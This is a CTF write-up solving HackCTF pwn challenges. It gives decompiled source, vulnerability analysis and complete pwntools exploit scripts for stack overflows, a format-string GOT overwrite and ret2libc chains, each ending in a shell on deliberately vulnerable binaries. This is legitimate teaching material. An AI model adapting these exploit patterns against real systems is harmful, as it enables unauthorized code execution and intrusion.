---
title: 'HackCTF Pwn Challenges Writeup'
date: 2019-08-01T00:00:00.000Z
excerpt: >-
  Writeups for HackCTF's pwn category: basic BOF, format string bugs, heap
  exploitation (tcache), RTL chaining, and x64 buffer overflow.
tags:
  - ctf
  - writeup
  - pwn
  - hackctf
categories:
  - CTF
authors:
  - name: ph4nt0m
    link: 'https://github.com/Phantomn'
    image: 'https://github.com/Phantomn.png'
---

## Basic BOF #1

### Binary info

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

### Source

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[40]; // [esp+4h] [ebp-34h]
  int v5;     // [esp+2Ch] [ebp-Ch]

  v5 = 0x4030201;
  fgets(&s, 45, stdin);
  printf("\n[buf]: %s\n", &s);
  printf("[check] %p\n", v5);
  if ( v5 != 0x4030201 && v5 != 0xDEADBEEF )
    puts("\nYou are on the right way!");
  if ( v5 == 0xDEADBEEF )
  {
    puts("Yeah dude! You win!\nOpening your shell...");
    system("/bin/dash");
  }
  return 0;
}
```

### Analysis

Buffer `s` is 40 bytes. `v5` sits at `ebp-0xC`, which is 40 bytes above the start of `s` (`ebp-0x34`). Overflowing `s` by exactly 40 bytes reaches `v5`, letting us overwrite it with `0xDEADBEEF` to get a shell.

### Exploit

```python
from pwn import *

e = ELF("./bof_basic")
r = remote("ctf.j0n9hyun.xyz", 3000)

payload = b"A" * 40 + p32(0xdeadbeef)
r.sendline(payload)
r.interactive()
```

```
$ id
uid=1000(attack) gid=1000(attack) groups=1000(attack)
```

---

## Basic BOF #2

### Binary info

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

### Source

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[80];        // [esp+Ch] [ebp-8Ch]
  void (*v5)(void);  // [esp+8Ch] [ebp-Ch]

  v5 = (void (*)(void))sup;
  fgets(s, 133, stdin);
  v5();
  return 0;
}
```

### Analysis

`v5` is a function pointer initialized to `sup` (a harmless function). It sits at `ebp-0xC`, which is `0x80` = 128 bytes above the start of the buffer (`ebp-0x8C`). The buffer is 80 bytes, so the gap between the end of `s` and `v5` is `128 - 80 = 48` bytes.

Overflowing 80 + 48 = 128 bytes and writing the address of a function that runs a shell redirects the `v5()` call to that function.

```
shell = 0x804849b  # address of the win function
```

### Exploit

```python
from pwn import *

e = ELF("./bof_basic2")
r = remote("ctf.j0n9hyun.xyz", 3001)
shell = 0x804849b

payload = b"A" * 80 + b"B" * 48 + p32(shell)
r.sendline(payload)
r.interactive()
```

```
$ id
uid=1000(attack) gid=1000(attack) groups=1000(attack)
```

---

## Basic FSB

### Binary info

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x8048000)
RWX:      Has RWX segments
```

### Source

```c
int flag()
{
  puts("EN)you have successfully modified the value :)");
  return system("/bin/sh");
}

int vuln()
{
  char s[1024];
  char format;

  printf("input : ");
  fgets(s, 1024, stdin);
  snprintf(&format, 0x400u, s);
  return printf(&format);  // format string bug
}
```

### Analysis

User input `s` is copied into `format` via `snprintf`, then passed directly to `printf`. This is a classic format string vulnerability — since the attacker controls the format string, arbitrary values can be written to arbitrary addresses.

The goal is to overwrite `printf`'s GOT entry with the address of `flag()`. The next `printf` call then executes it instead of returning a shell.

- `printf` GOT: `e.got['printf']`
- `flag` address: `0x80485b4`
- Format string offset: `2` (determined by probing with `%1$x`, `%2$x`, ...)

pwntools' `fmtstr_payload` automates constructing the write-what-where payload.

### Exploit

```python
from pwn import *

e = ELF("./basic_fsb")
r = remote("ctf.j0n9hyun.xyz", 3002)
printf_got = e.got['printf']
flag = 0x80485b4
offset = 2

payload = fmtstr_payload(offset, {printf_got: flag})
r.sendline(payload)
r.interactive()
```

```
input : EN)you have successfully modified the value :)
$ id
uid=1000(attack) gid=1000(attack) groups=1000(attack)
```

---

## x64 Buffer Overflow

### Binary info

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

### Source

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[268]; // [rsp+10h] [rbp-110h]
  int v5;      // [rsp+11Ch] [rbp-4h]

  _isoc99_scanf("%s", s, envp);
  v5 = strlen(s);
  printf("Hello %s\n", s);
  return 0;
}
```

### Analysis

The buffer is `0x110` = 272 bytes, but since there's an 8-byte saved RBP at `rbp-0x110`, the return address sits at offset 272 + 8 = 280 bytes from `s`. `scanf("%s")` has no length limit, so a ROP-based overflow is immediately possible.

With no canary and no PIE, we can directly call the hidden `callMeMaybe` function at `0x400606`. On x86-64 the first argument should go in `rdi`, but in the simplest case where no argument is needed, we just need the function address after the offset padding:

```
offset = 280
payload = "A" * 280 + p64(callMeMaybe)
```

### Exploit

```python
from pwn import *

e = ELF("./64bof_basic")
r = remote("ctf.j0n9hyun.xyz", 3004)
offset = 280
pr_rdi = 0x400713
callMeMaybe = 0x400606

payload = b"A" * offset + p64(callMeMaybe)
r.sendline(payload)
r.interactive()
```

```
$ id
uid=1000(attack) gid=1000(attack) groups=1000(attack)
```

---

## beginner_heap

### Binary info

```
Arch:     amd64-64-little
NX:       NX enabled
Stack canary present
```

### Source

```c
void __fastcall __noreturn main(int a1, char **a2, char **a3)
{
  void *v3;  // [rsp+10h] [rbp-1020h]
  void *v4;  // [rsp+18h] [rbp-1018h]
  char s[4104];

  v3 = malloc(16);
  *v3 = 1;
  *(v3 + 1) = malloc(8);   // internal buffer for v3

  v4 = malloc(16);
  *v4 = 2;
  *(v4 + 1) = malloc(8);   // internal buffer for v4

  fgets(s, 4096, stdin);
  strcpy(*(v3 + 1), s);    // unchecked copy into an 8-byte buffer

  fgets(s, 4096, stdin);
  strcpy(*(v4 + 1), s);

  exit(0);
}
```

### Analysis

Each "node" is a 16-byte heap chunk: the first 8 bytes hold an integer ID, and the next 8 bytes hold a pointer to an 8-byte internal buffer. The first `strcpy` copies up to 4096 bytes into `v3`'s 8-byte internal buffer, overflowing upward on the heap.

Since `v4`'s 16-byte chunk sits right after `v3`'s internal buffer (8 bytes), the overflow can overwrite `v4`'s fields — in particular, the pointer at `*(v4 + 1)`. The second `strcpy` then writes to whatever address `*(v4 + 1)` now points to, giving us a write-what-where primitive.

The target is `get_flag` — a function that reads and prints the flag. Getting the second write to overwrite a function pointer (or a GOT entry reachable via `exit`) causes `get_flag` to execute.

The tcache allocator in glibc >= 2.26 immediately recycles freed chunks of the same size, so the layout is deterministic in this simple case.

---

## RTL_core

### Binary info

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

### Source

```c
int __cdecl check_passcode(int a1)
{
  int v2 = 0;
  for ( int i = 0; i <= 4; ++i )
    v2 += *(_DWORD *)(4 * i + a1);
  return v2;
}

ssize_t core()
{
  int buf;
  // ...
  void *v4 = dlsym((void *)0xFFFFFFFF, "printf");
  printf(&format, v4);          // leaks the printf address
  return read(0, &buf, 0x64u);  // BOF
}

int main(int argc, const char **argv, const char **envp)
{
  char s[24];
  gets(s);                                  // unchecked read
  if ( check_passcode((int)s) == hashcode ) // hashcode = 3235492007
    core();
}
```

### Stage 1 — bypassing the passcode

`check_passcode` sums five consecutive 32-bit integers starting from the input buffer and compares it to `hashcode = 3235492007`.

`3235492007 / 5 = 647098401` remainder `2`. So four equal values plus one value that's 2 larger makes the sum match:

```
data = 0x2691f021  # 647098401
payload = p32(data) * 4 + p32(data + 2)
```

### Stage 2 — ret2libc

Once the passcode check passes, `core()` leaks the runtime address of `printf` via `dlsym`, then reads 100 bytes into a 62-byte buffer (`buf` is at `ebp-0x3E`), allowing a 38-byte overflow.

Using the leaked `printf` address, we compute the libc base and the offsets for `system` and `/bin/sh`. The return-to-libc chain:

```
[66B padding] [system] [AAAA] [/bin/sh]
```

### Full exploit

```python
from pwn import *

context.arch = 'i386'
p = process("./rtlcore")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")

# Stage 1
data = 0x2691f021
payload = p32(data) * 4 + p32(data + 2)
p.recvuntil("Passcode: ")
p.sendline(payload)

# leak printf
p.recvuntil("0x")
printf = int(p.recv(8), 16)
print("printf addr:", hex(printf))

libc_base  = printf - libc.symbols['printf']
system_addr = libc_base + libc.symbols['system']
binsh_addr  = libc_base + next(libc.search(b"/bin/sh"))

# Stage 2
payload2 = b"A" * 66
payload2 += p32(system_addr)
payload2 += b"AAAA"
payload2 += p32(binsh_addr)
p.sendline(payload2)
p.interactive()
```

```
$ id
uid=1000(phantom) gid=1000(phantom) groups=1000(phantom)
```

---

## gift

### Binary info

```
Arch:     i386-32-little
RELRO:    No RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

### Source

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[128];

  printf("Hey guyssssssssss here you are: %p %p\n", &binsh, &system);
  fgets(s, 128, stdin);
  printf(s);   // format string vulnerability (unused here)
  gets(s);     // unbounded read — BOF
  return 0;
}
```

### Analysis

The binary first hands us two addresses: `&binsh` (a writable global buffer meant to hold the `/bin/sh` string) and `&system` (a pointer to `system()`). Note that `&binsh` isn't a pointer to the string itself — it's the **buffer** that we must first write `/bin/sh` into.

Two-stage exploit:
1. Use `gets@plt` to write `/bin/sh\x00` into the `binsh` buffer (gadget: `pop ret` to clean up the argument).
2. Call `system(binsh)` via RTL.

The overflow offset from `s` to the saved EIP is `128 + 4 (saved EBP) = 136` bytes.

### Exploit

```python
from pwn import *

p = process("./gift")
e = ELF("./gift")
context.arch = 'i386'

p.recvuntil("Hey guyssssssssss here you are: ")
data = p.recvline().split()
binsh  = int(data[0], 16)
system = int(data[1], 16)

popret    = 0x080483ad
gets_plt  = e.plt['gets']

# process fgets input (format string stage)
p.sendline(b"A" * 4)

# BOF via gets: call gets(binsh), then call system(binsh)
payload  = b"A" * 136
payload += p32(gets_plt)
payload += p32(popret)
payload += p32(binsh)
payload += p32(system)
payload += b"BBBB"
payload += p32(binsh)

p.sendline(payload)
p.sendline(b"/bin/sh\x00")
p.interactive()
```

```
$ id
uid=1000(phantom) gid=1000(phantom) groups=1000(phantom)
```

---

## fengshui

### Binary info

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

### Source overview

A heap management challenge with four operations: Add, Delete, Display, Update.

```c
// add_location: allocates a variable-size description buffer + a fixed 0x80 metadata chunk
_DWORD *__cdecl add_location(size_t a1)
{
  void *s  = malloc(a1);      // description buffer (user-controlled size)
  _DWORD *v3 = malloc(0x80);  // metadata chunk
  *v3 = s;                    // v3[0] = description pointer
  // v3[4..] = name (up to 124 bytes)
  *(&store + cnt) = v3;
  update_desc(cnt++);
  return v3;
}

// update_desc: bounds-checked write to the description buffer
unsigned int __cdecl update_desc(unsigned __int8 a1)
{
  int v3 = 0;
  scanf("%u%c", &v3, &v2);
  // protection: reject writes that would reach the metadata chunk
  if ( (char *)(v3 + *v3_desc_ptr) >= (char *)metadata_ptr - 4 )
  {
    puts("Nah...");
    exit(1);
  }
  read_len(*desc_ptr, v3 + 1);
}
```

### Vulnerability

The bounds check in `update_desc` compares the end of the requested write against the metadata pointer minus 4. By carefully allocating chunks of specific sizes, a freed description buffer from one location can be recycled as the metadata chunk of the next allocation (tcache/fastbin reuse). This lets a description write overwrite another location's `*v3` field (the description pointer).

Once the pointer is corrupted, a `display_location` call leaks heap or libc addresses, and a subsequent `update_desc` can write to an arbitrary address — a GOT overwrite or similar technique redirects execution to a shell.

The exact payload depends on the libc version and the runtime heap layout, but the general primitive chain is: **heap overflow -> pointer corruption -> arbitrary write -> GOT overwrite -> shell**.

---

## / (Hidden Flag)

A web challenge. Visiting the site only shows a photo of a robot.

![The "/" challenge page — a robot photo with a hidden flag](/images/writeups/hackctf/slash-hidden-flag.png)

The challenge is named `/` and hints at a robot photo, so we check `robots.txt`.

```
User-agent: *
Disallow: /robot_flag/
```

Visiting that path (`/robot_flag/`) reveals the flag.

---

## RTC (Return to CSU)

An x64 ret2csu technique challenge. Leak the GOT with `write`, then feed `/bin/sh` and the system address via `read` to get a shell.

![RTC binary — ret2csu using the csu_init/csu_call gadgets](/images/writeups/hackctf/rtc-binary.png)

```python
from pwn import *

p = remote("ctf.j0n9hyun.xyz", 3025)
e = ELF("./rtc")
libc = ELF("./libc.so.6")

read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
write_got = e.got['write']

csu_init = 0x4006ba
csu_call = 0x4006a0
bss = 0x601060

# csu_call(write(1, read_got, 8)) -> leak the libc address
# csu_call(read(0, bss, 8)) -> input /bin/sh
# csu_call(read(0, write_got, 8)) -> overwrite the GOT
# csu_call(write(bss)) -> execute the shell
```

---

## Smooth CipherText

A challenge combining Vigenere and Caesar ciphers.

![First-pass decryption with a Vigenere cipher tool](/images/writeups/hackctf/smooth-cipher-vigenere.png)

Decrypting first with a Vigenere cipher tool doesn't fully decode the flag portion. Retrying just that portion with a Caesar cipher works.

![Second-pass decryption of the flag portion with a Caesar cipher](/images/writeups/hackctf/smooth-cipher-caesar.png)
